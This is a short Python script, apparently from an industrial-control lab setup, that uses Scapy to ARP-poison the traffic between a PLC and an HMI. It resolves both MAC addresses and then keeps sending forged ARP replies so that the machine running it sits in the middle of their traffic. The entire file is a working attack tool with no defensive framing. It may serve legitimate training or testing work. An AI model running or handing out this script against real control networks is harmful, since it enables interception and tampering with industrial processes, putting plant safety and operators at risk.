import sys, time, subprocess
sys.path.insert(0, "/app")
from scapy.all import ARP, send, getmacbyip
from shared.config import PLC_IP, HMI_IP

# warm up the ARP cache so MAC resolution works
for ip in (PLC_IP, HMI_IP):
    subprocess.run(["ping", "-c", "1", "-W", "1", ip],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

plc_mac = getmacbyip(PLC_IP)
hmi_mac = getmacbyip(HMI_IP)
print(f"[*] PLC {PLC_IP} is at {plc_mac}")
print(f"[*] HMI {HMI_IP} is at {hmi_mac}")

if plc_mac is None or hmi_mac is None:
    print("[!] Could not resolve one of the MACs. Is the HMI running?")
    sys.exit(1)

def poison():
    send(ARP(op=2, pdst=HMI_IP, hwdst=hmi_mac, psrc=PLC_IP), verbose=0)
    send(ARP(op=2, pdst=PLC_IP, hwdst=plc_mac, psrc=HMI_IP), verbose=0)

print("[*] Poisoning... press Ctrl+C to stop")
try:
    while True:
        poison()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Stopped")
